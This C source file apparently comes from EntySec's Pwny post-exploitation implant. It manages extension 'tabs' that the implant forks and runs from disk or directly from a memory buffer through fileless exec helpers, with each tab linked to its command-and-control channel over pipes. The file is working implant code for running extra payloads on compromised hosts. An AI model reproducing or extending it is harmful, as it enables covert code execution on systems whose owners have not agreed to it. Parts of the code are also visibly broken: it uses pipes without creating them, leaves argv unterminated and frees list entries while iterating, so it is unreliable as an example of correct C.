/*
 * MIT License
 *
 * Copyright (c) 2020-2023 EntySec
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in all
 * copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 * SOFTWARE.
 */

#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <signal.h>

#include <sys/types.h>
#include <sys/wait.h>

#include <tab.h>
#include <c2.h>
#include <log.h>
#include <tlv.h>
#include <tlv_types.h>
#include <api.h>
#include <pawn.h>

#include <uthash/uthash.h>

static int create_tab_disk(tabs_t *tab, char *filename)
{
    c2_t *c2;
    pid_t pid;

    int pipes[2];
    char *argv[1];

    c2 = c2_create(tab->id, NULL_FD, NULL);

    if (c2 == NULL)
    {
        return -1;
    }

    pid = fork();

    if (pid == -1)
    {
        c2_destroy(c2, FD_CLOSE);
        return -1;
    }

    else if (pid == 0)
    {
        dup2(pipes[0], STDIN_FILENO);
        argv[0] = "pwny";

        execv(filename, argv);
        exit(EXIT_SUCCESS);
    }
    else
    {
        fcntl(pipes[1], F_SETFL, O_NONBLOCK);

        c2->fd = pipes[1];
        tab->c2 = c2;
        tab->pid = pid;
    }

    return 0;
}

static int create_tab_buffer(tabs_t *tab, unsigned char *buffer, int size)
{
    c2_t *c2;
    pid_t pid;

    int pipes[2];
    char *argv[1];
    unsigned char *frame;

    if (pipe(pipes) == -1)
    {
        return -1;
    }

    frame = malloc(size);

    if (frame == NULL)
    {
        return -1;
    }

    memcpy(frame, buffer, size);
    pid = fork();

    c2 = c2_create(tab->id, NULL_FD, NULL);

    if (c2 == NULL)
    {
        return -1;
    }

    if (pid == -1)
    {
        free(frame);
        c2_destroy(c2, FD_CLOSE);
        return -1;
    }
    else if (pid == 0)
    {
        dup2(pipes[0], STDIN_FILENO);
        argv[0] = "pwny";

#if defined(__APPLE__)
        pawn_exec_bundle(frame, argv, NULL);
#elif defined(__linux__) || defined(__unix__)
        pawn_exec_fd(frame, argv, environ);
#elif defined(_WIN32)
        pawn_exec(frame, argv, environ);
#endif

        free(frame);
        exit(EXIT_SUCCESS);
    }
    else
    {
        fcntl(pipes[1], F_SETFL, O_NONBLOCK);

        c2->fd = pipes[1];
        tab->c2 = c2;
        tab->pid = pid;
    }

    return 0;
}

tlv_pkt_t *tab_lookup(tabs_t **tabs, int id, c2_t *c2)
{
    tabs_t *tab;
    tlv_pkt_t *tlv_pkt;

    log_debug("* Searching for tab entry (%d)\n", id);

    HASH_FIND_INT(*tabs, &id, tab);

    if (tab != NULL)
    {
        log_debug("* Found tab entry (%d)\n", id);

        if (c2_write(tab->c2, c2->tlv_pkt) < 0)
        {
            return NULL;
        }

        tlv_pkt = tlv_pkt_create();

        if (c2_read(tab->c2, tlv_pkt) < 0)
        {
            tlv_pkt_destroy(tlv_pkt);
            return NULL;
        }

        return tlv_pkt;
    }

    log_debug("* Tab was not found (%d)\n", id);
    return NULL;
}

int tab_add_disk(tabs_t **tabs, int id, char *filename)
{
    tabs_t *tab;
    tabs_t *tab_new;

    HASH_FIND_INT(*tabs, &id, tab);

    if (tab == NULL)
    {
        tab_new = calloc(1, sizeof(*tab_new));

        if (tab_new != NULL)
        {
            tab_new->id = id;

            if (create_tab_disk(tab_new, filename) < 0)
            {
                free(tab_new);
                return -1;
            }

            HASH_ADD_INT(*tabs, id, tab_new);
            log_debug("* Added tab entry (%d)\n", id);

            return 0;
        }
    }

    return -1;
}

int tab_add_buffer(tabs_t **tabs, int id, unsigned char *buffer, int size)
{
    tabs_t *tab;
    tabs_t *tab_new;

    HASH_FIND_INT(*tabs, &id, tab);

    if (tab == NULL)
    {
        tab_new = calloc(1, sizeof(*tab_new));

        if (tab_new != NULL)
        {
            tab_new->id = id;

            if (create_tab_buffer(tab_new, buffer, size) < 0)
            {
                free(tab_new);
                return -1;
            }

            HASH_ADD_INT(*tabs, id, tab_new);
            log_debug("* Added tab entry (%d)\n", id);

            return 0;
        }
    }

    return -1;
}

void tab_wait(tabs_t *tab)
{
    pid_t pid;
    int status;

    do
    {
        pid = waitpid(tab->pid, &status, 0);
        if (pid == -1)
        {
            break;
        }
    }
    while (!WIFEXITED(status) && !WIFSIGNALED(status));
}

int tab_exit(tabs_t *tab)
{
    tlv_pkt_t *tlv_pkt;

    tlv_pkt = tlv_pkt_create();

    if (tlv_pkt_add_int(tlv_pkt, TLV_TYPE_TAG, TAB_TERM) < 0)
    {
        goto fail;
    }

    if (c2_write(tab->c2, tlv_pkt) < 0)
    {
        goto fail;
    }

    log_debug("* Waiting for tab to shutdown (%d)\n", tab->id);
    tab_wait(tab);

    log_debug("* Tab %d on PID %d shutdown\n", tab->id, tab->pid);

    return 0;

fail:
    tlv_pkt_destroy(tlv_pkt);
    return -1;
}

int tab_delete(tabs_t **tabs, int id)
{
    tabs_t *tab;

    HASH_FIND_INT(*tabs, &id, tab);

    if (tab != NULL)
    {
        if (tab_exit(tab) < 0)
        {
            return -1;
        }

        HASH_DEL(*tabs, tab);

        c2_destroy(tab->c2, FD_CLOSE);
        free(tab);

        log_debug("* Deleted tab entry (%d)\n", id);
        return 0;
    }

    return -1;
}

void tabs_free(tabs_t *tabs)
{
    tabs_t *tab;

    for (tab = tabs; tab != NULL; tab = tab->hh.next)
    {
        if (tab_exit(tab) < 0)
        {
            continue;
        }

        log_debug("* Freed tab entry (%d)\n", tab->id);
        HASH_DEL(tabs, tab);

        c2_destroy(tab->c2, FD_CLOSE);
        free(tab);
    }

    free(tabs);
}
